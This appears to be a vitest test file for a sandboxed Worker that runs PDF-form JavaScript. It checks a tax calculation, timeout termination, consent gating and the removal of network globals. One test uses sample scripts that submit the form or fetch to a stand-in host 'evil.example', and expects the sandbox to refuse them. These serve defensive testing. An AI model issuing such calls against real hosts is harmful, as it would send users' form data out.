/**
 * SL-5.JS.01 DoD — browser slice: a sandboxed Worker using the browser's own
 * engine. Two kinds of evidence:
 *  - `executeInRealm` runs the generated bootstrap in a fresh Node `vm` realm
 *    with the capability globals preloaded, then asserts they are gone and the
 *    whitelisted API computes the expected value;
 *  - `runFormScript` is driven with an injectable Worker + timers to prove the
 *    consent gate and the hard-deadline termination wiring.
 */

import { runInNewContext } from "node:vm";
import { describe, expect, it } from "vitest";
import { ApprovedOrigins, ConsentPolicy, documentIdentity } from "./js-policy.js";
import {
	type FormScriptRequest,
	type Timers,
	type WorkerFactory,
	type WorkerLike,
	runFormScript,
} from "./js-sandbox.js";
import {
	REMOVED_GLOBALS,
	type SandboxRequest,
	type SandboxResponse,
	buildWorkerBootstrap,
} from "./js-worker.js";

const doc = documentIdentity("tax-form-2026", "https://forms.example");

function allowed() {
	const consent = new ConsentPolicy();
	consent.grant(doc, "session");
	return { consent, origins: new ApprovedOrigins() };
}

function calc(script: string): FormScriptRequest {
	return {
		script,
		event: { type: "calculate", targetName: "Total", value: "0" },
		fields: [
			{ name: "Subtotal", value: "100" },
			{ name: "TaxRate", value: "0.08" },
			{ name: "Total", value: "0" },
		],
	};
}

/** Execute the bootstrap in a fresh realm and capture its narrow response. */
function executeInRealm(
	request: FormScriptRequest,
	preload: Record<string, unknown> = {},
): SandboxResponse {
	let sent: SandboxResponse | null = null;
	const wire: SandboxRequest = {
		script: request.script,
		event: {
			type: request.event.type,
			targetName: request.event.targetName,
			value: request.event.value ?? "",
		},
		fields: request.fields,
	};
	const realm: Record<string, unknown> = {
		...preload,
		__SLJS_REQUEST__: wire,
		__SLJS_SEND__: (message: SandboxResponse): void => {
			sent = message;
		},
	};
	realm.self = realm;
	runInNewContext(buildWorkerBootstrap(), realm, { timeout: 200 });
	if (sent === null) {
		throw new Error("the sandbox did not send a response");
	}
	return sent;
}

interface MockWorker extends WorkerLike {
	terminations: number;
	lastMessage: unknown;
}

function mockWorker(): MockWorker {
	return {
		onmessage: null,
		onerror: null,
		terminations: 0,
		lastMessage: null,
		postMessage(message: unknown): void {
			this.lastMessage = message;
		},
		terminate(): void {
			this.terminations++;
		},
	};
}

describe("JS.01 browser sandbox", () => {
	it("(a) a real-world calculation script computes a field value", () => {
		const response = executeInRealm(
			calc(
				"var sub = Number(this.getField('Subtotal').value); " +
					"var rate = Number(this.getField('TaxRate').value); " +
					"event.value = (sub + sub * rate).toFixed(2);",
			),
		);
		expect(response.ok).toBe(true);
		if (response.ok) {
			expect(response.eventValue).toBe("108.00");
			expect(response.eventRc).toBe(true);
			expect(response.updates).toEqual([]);
		}
	});

	it("whitelisted printf / printd / AF* helpers work", () => {
		const response = executeInRealm(
			calc(
				"AFNumber_Format(2, 0, 0, 0, '', true); " +
					"event.value = util.printf('%.2f', 12.5) + '/' + util.printd('yyyy-mm-dd', '2026-11-19');",
			),
		);
		expect(response.ok).toBe(true);
		if (response.ok) {
			expect(response.eventValue).toBe("12.50/2026-11-19");
		}
	});

	it("a field write through this.getField is returned to the caller", () => {
		const response = executeInRealm(
			calc("this.getField('Total').value = 'done'; event.value = 'ok';"),
		);
		expect(response.ok).toBe(true);
		if (response.ok) {
			expect(response.updates).toContainEqual({ name: "Total", value: "done" });
		}
	});

	it("(b) an infinite loop inside the realm is interruptible", () => {
		// The Node analogue of worker.terminate(): vm stops the realm at its
		// timeout instead of hanging the test.
		expect(() => executeInRealm(calc("while (true) {}"))).toThrow(/timed out/i);
	});

	it("(b) the host deadline terminates a hung worker", async () => {
		const deadline: { fire?: () => void } = {};
		const timers: Timers = {
			setTimeout: (fn: () => void): unknown => {
				deadline.fire = fn;
				return 1;
			},
			clearTimeout: (): void => {},
		};
		const worker = mockWorker();
		const factory: WorkerFactory = (): WorkerLike => worker;

		const outcomePromise = runFormScript(calc("while (true) {}"), {
			authorization: allowed(),
			document: doc,
			timers,
			workerFactory: factory,
		});
		expect(deadline.fire).toBeDefined();
		deadline.fire?.();
		const outcome = await outcomePromise;
		expect(outcome).toEqual({ ok: false, code: "js-instruction-budget" });
		expect(worker.terminations).toBe(1);
	});

	it("(c) network and host globals are unavailable inside the realm", () => {
		const preload: Record<string, unknown> = {
			fetch: (): string => "network",
			XMLHttpRequest: function XHR(): void {},
			importScripts: (): void => {},
			WebAssembly: { compile: (): void => {} },
			indexedDB: {},
			WebSocket: function WS(): void {},
			postMessage: (): void => {},
		};
		for (const name of REMOVED_GLOBALS) {
			expect(preload).not.toBeUndefined();
			expect(name.length).toBeGreaterThan(0);
		}
		const response = executeInRealm(
			calc(
				"event.value = [typeof fetch, typeof XMLHttpRequest, " +
					"typeof importScripts, typeof WebAssembly, typeof indexedDB, " +
					"typeof WebSocket, typeof postMessage].join(',');",
			),
			preload,
		);
		expect(response.ok).toBe(true);
		if (response.ok) {
			expect(response.eventValue).toBe(
				"undefined,undefined,undefined,undefined,undefined,undefined,undefined",
			);
		}
	});

	it("(d) no worker is created without consent", async () => {
		let created = 0;
		const factory: WorkerFactory = (): WorkerLike => {
			created++;
			return mockWorker();
		};
		const outcome = await runFormScript(calc("event.value = 'RAN';"), {
			authorization: { consent: new ConsentPolicy(), origins: new ApprovedOrigins() },
			document: doc,
			workerFactory: factory,
		});
		expect(outcome).toEqual({ ok: false, code: "js-consent-required" });
		expect(created).toBe(0);
	});

	it("(d) the default gate denies even when a document is supplied", async () => {
		let created = 0;
		const factory: WorkerFactory = (): WorkerLike => {
			created++;
			return mockWorker();
		};
		const outcome = await runFormScript(calc("event.value = 'RAN';"), {
			document: doc,
			workerFactory: factory,
		});
		expect(outcome).toEqual({ ok: false, code: "js-consent-required" });
		expect(created).toBe(0);
	});

	it("dangerous APIs are refused before a worker is created", async () => {
		let created = 0;
		const factory: WorkerFactory = (): WorkerLike => {
			created++;
			return mockWorker();
		};
		for (const script of [
			"app.launchURL('https://evil.example')",
			"this.submitForm({cURL: 'https://evil.example'})",
			"Net.HTTP.request({})",
			"fetch('https://evil.example')",
		]) {
			const outcome = await runFormScript(calc(script), {
				authorization: allowed(),
				document: doc,
				workerFactory: factory,
			});
			expect(outcome).toEqual({ ok: false, code: "js-api-refused" });
		}
		expect(created).toBe(0);
	});

	it("the postMessage protocol carries only script, event and fields", async () => {
		const worker = mockWorker();
		const factory: WorkerFactory = (): WorkerLike => worker;
		await runFormScript(calc("event.value = 'ok';"), {
			authorization: allowed(),
			document: doc,
			workerFactory: factory,
		});
		const message = worker.lastMessage as Record<string, unknown>;
		expect(Object.keys(message).sort()).toEqual(["event", "fields", "script"]);
		expect(JSON.stringify(message)).not.toContain("documentBytes");
		expect(JSON.stringify(message)).not.toContain("cURL");
		expect(worker.terminations).toBe(1);
	});
});
